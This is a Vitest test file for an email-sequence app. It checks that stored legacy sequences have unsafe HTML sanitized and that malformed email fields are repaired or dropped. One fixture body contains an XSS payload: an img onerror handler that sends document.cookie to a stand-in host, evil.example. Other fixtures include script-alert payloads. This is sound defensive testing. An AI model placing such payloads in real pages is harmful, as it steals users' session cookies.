// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { cloneSequenceRecord, isRecoverableSequenceRecord, normalizeSavedSequence } from "@/lib/storage/sequences";
import type { SavedSequence } from "@/types";

function buildLegacySequence(overrides?: Partial<SavedSequence>): SavedSequence {
  return {
    id: "seq-legacy-1",
    name: "Legacy Co — old prospects",
    businessName: "Legacy Co",
    senderName: "Faiza Ijaz",
    recipientFirstName: "",
    industry: "saas",
    targetAudience: "old prospects",
    painPoint: "slow onboarding",
    offer: "a faster onboarding flow",
    tone: "professional",
    emailLength: "medium",
    ctaType: "quick-reply",
    framework: "AIDA",
    emails: [
      {
        slot: "introduction",
        label: "Email 1 — Introduction",
        subject: "idea for Legacy Co",
        body: '<p>Hi John,</p><img src=x onerror="fetch(\'https://evil.example/c?c=\'+document.cookie)"><script>alert(1)</script>',
        format: "html",
        delayDays: 0,
      },
    ],
    score: 70,
    status: "draft",
    createdAt: "2026-01-01T00:00:00.000Z",
    updatedAt: "2026-01-01T00:00:00.000Z",
    ...overrides,
  };
}

describe("normalizeSavedSequence — legacy HTML sanitization", () => {
  it("sanitizes unsafe HTML in an already-stored (legacy) sequence on read", () => {
    const legacy = buildLegacySequence();

    const normalized = normalizeSavedSequence(legacy);

    expect(normalized.emails[0]?.body).not.toMatch(/onerror/i);
    expect(normalized.emails[0]?.body).not.toMatch(/<script/i);
    expect(normalized.emails[0]?.body).not.toMatch(/evil\.example/i);
    expect(normalized.emails[0]?.body).toContain("Hi John,");
  });

  it("does not touch plain-format bodies with an HTML sanitizer", () => {
    const legacy = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "Hi John, <this is not a tag> just plain text with a stray angle bracket.",
          format: "plain",
          delayDays: 0,
        },
      ],
    });

    const normalized = normalizeSavedSequence(legacy);

    expect(normalized.emails[0]?.body).toBe(legacy.emails[0]?.body);
  });

  it("does not crash on malformed/unexpected HTML", () => {
    const legacy = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "<p>unclosed paragraph <strong>bold <em>and unclosed em",
          format: "html",
          delayDays: 0,
        },
      ],
    });

    expect(() => normalizeSavedSequence(legacy)).not.toThrow();
    expect(normalizeSavedSequence(legacy).emails[0]?.body).toContain("bold");
  });

  it("leaves an already-clean sequence's HTML untouched (referentially stable)", () => {
    const clean = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "<p>Hi <strong>John</strong>,</p><p>Body text.</p>",
          format: "html",
          delayDays: 0,
        },
      ],
    });

    const normalized = normalizeSavedSequence(clean);

    expect(normalized).toBe(clean);
  });
});

/** A cast-through-unknown helper — mirrors how real malformed localStorage JSON reaches these functions: typed as `SavedSequence` at the call site, but not actually validated to conform at runtime. */
function asPersisted(value: unknown): SavedSequence {
  return value as SavedSequence;
}

describe("normalizeSavedSequence — malformed `emails` recovery", () => {
  it("defaults emails to [] when the field is missing entirely, preserving every other field", () => {
    const legacy = buildLegacySequence();
    const withoutEmails: Record<string, unknown> = { ...legacy };
    delete withoutEmails.emails;
    const malformed = asPersisted(withoutEmails);

    const normalized = normalizeSavedSequence(malformed);

    expect(normalized.emails).toEqual([]);
    expect(normalized.name).toBe(legacy.name);
    expect(normalized.businessName).toBe(legacy.businessName);
    expect(normalized.score).toBe(legacy.score);
  });

  it("defaults emails to [] when the field is null", () => {
    const malformed = asPersisted({ ...buildLegacySequence(), emails: null });
    expect(() => normalizeSavedSequence(malformed)).not.toThrow();
    expect(normalizeSavedSequence(malformed).emails).toEqual([]);
  });

  it("defaults emails to [] when the field is a plain object", () => {
    const malformed = asPersisted({ ...buildLegacySequence(), emails: { 0: "oops" } });
    expect(() => normalizeSavedSequence(malformed)).not.toThrow();
    expect(normalizeSavedSequence(malformed).emails).toEqual([]);
  });

  it("defaults emails to [] when the field is a string", () => {
    const malformed = asPersisted({ ...buildLegacySequence(), emails: "not an array" });
    expect(() => normalizeSavedSequence(malformed)).not.toThrow();
    expect(normalizeSavedSequence(malformed).emails).toEqual([]);
  });

  it("defaults emails to [] when the field is a number or boolean", () => {
    for (const value of [42, true, false]) {
      const malformed = asPersisted({ ...buildLegacySequence(), emails: value });
      expect(() => normalizeSavedSequence(malformed)).not.toThrow();
      expect(normalizeSavedSequence(malformed).emails).toEqual([]);
    }
  });

  it("drops individual malformed email entries (non-object, or missing subject/body) without dropping the whole record", () => {
    const malformed = asPersisted({
      ...buildLegacySequence(),
      emails: [
        null,
        "not an email",
        42,
        { slot: "introduction", label: "Email 1", format: "plain", delayDays: 0 }, // missing subject/body
        { subject: "valid subject", body: "valid body", slot: "introduction", label: "Email 1", format: "plain", delayDays: 0 },
      ],
    });

    const normalized = normalizeSavedSequence(malformed);

    expect(normalized.emails).toHaveLength(1);
    expect(normalized.emails[0]?.subject).toBe("valid subject");
    expect(normalized.emails[0]?.body).toBe("valid body");
  });

  it("repairs (rather than drops) an email entry with valid content but a bad slot/format/delayDays/label", () => {
    const malformed = asPersisted({
      ...buildLegacySequence(),
      emails: [
        {
          subject: "Real subject",
          body: "Real body",
          slot: "not-a-real-slot",
          label: 12345,
          format: "rtf",
          delayDays: "soon",
        },
      ],
    });

    const normalized = normalizeSavedSequence(malformed);

    expect(normalized.emails).toHaveLength(1);
    const email = normalized.emails[0];
    expect(email?.subject).toBe("Real subject");
    expect(email?.body).toBe("Real body");
    expect(email?.slot).toBe("introduction");
    expect(typeof email?.label).toBe("string");
    expect(email?.format).toBe("plain");
    expect(email?.delayDays).toBe(0);
  });

  it("never throws for any malformed emails shape", () => {
    const shapes: unknown[] = [undefined, null, {}, "x", 0, [null, undefined, 1, "a", {}, []]];
    for (const emails of shapes) {
      const malformed = asPersisted({ ...buildLegacySequence(), emails });
      expect(() => normalizeSavedSequence(malformed)).not.toThrow();
    }
  });

  it("still sanitizes unsafe HTML after emails have been coerced", () => {
    const malformed = asPersisted({
      ...buildLegacySequence(),
      emails: [
        {
          subject: "s",
          body: '<p>Hi</p><img src=x onerror="alert(1)"><script>alert(2)</script>',
          format: "html",
          // slot/label/delayDays intentionally omitted — exercises coercion + sanitization together
        },
      ],
    });

    const normalized = normalizeSavedSequence(malformed);

    expect(normalized.emails).toHaveLength(1);
    expect(normalized.emails[0]?.body).not.toMatch(/onerror/i);
    expect(normalized.emails[0]?.body).not.toMatch(/<script/i);
    expect(normalized.emails[0]?.body).toContain("Hi");
  });

  it("still backfills senderName even when emails is also malformed", () => {
    const malformed = asPersisted({
      ...buildLegacySequence({ senderName: "" }),
      businessName: "Legacy Co",
      emails: null,
    });

    const normalized = normalizeSavedSequence(malformed);

    expect(normalized.senderName).toBe("Legacy Co");
    expect(normalized.emails).toEqual([]);
  });

  it("leaves a fully well-formed record referentially untouched (no unnecessary rebuild)", () => {
    const clean = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "plain body",
          format: "plain",
          delayDays: 0,
        },
      ],
    });

    const normalized = normalizeSavedSequence(clean);

    expect(normalized).toBe(clean);
  });
});

describe("isRecoverableSequenceRecord", () => {
  it("accepts any object with a non-empty string id", () => {
    expect(isRecoverableSequenceRecord({ id: "seq-1" })).toBe(true);
    expect(isRecoverableSequenceRecord(buildLegacySequence())).toBe(true);
  });

  it("rejects values with no usable id", () => {
    expect(isRecoverableSequenceRecord(null)).toBe(false);
    expect(isRecoverableSequenceRecord(undefined)).toBe(false);
    expect(isRecoverableSequenceRecord("just a string")).toBe(false);
    expect(isRecoverableSequenceRecord(42)).toBe(false);
    expect(isRecoverableSequenceRecord([])).toBe(false);
    expect(isRecoverableSequenceRecord({})).toBe(false);
    expect(isRecoverableSequenceRecord({ id: "" })).toBe(false);
    expect(isRecoverableSequenceRecord({ id: 123 })).toBe(false);
  });
});

describe("cloneSequenceRecord — malformed emails on the raw record", () => {
  it("does not throw and produces an empty emails array when the original's emails is malformed", () => {
    const malformed = asPersisted({ ...buildLegacySequence(), emails: null });
    expect(() => cloneSequenceRecord(malformed)).not.toThrow();
    expect(cloneSequenceRecord(malformed).emails).toEqual([]);
  });

  it("drops malformed individual entries when cloning, keeping valid ones", () => {
    const malformed = asPersisted({
      ...buildLegacySequence(),
      emails: [null, { subject: "kept", body: "kept body", slot: "introduction", label: "L", format: "plain", delayDays: 0 }],
    });

    const cloned = cloneSequenceRecord(malformed);

    expect(cloned.emails).toHaveLength(1);
    expect(cloned.emails[0]?.subject).toBe("kept");
  });
});
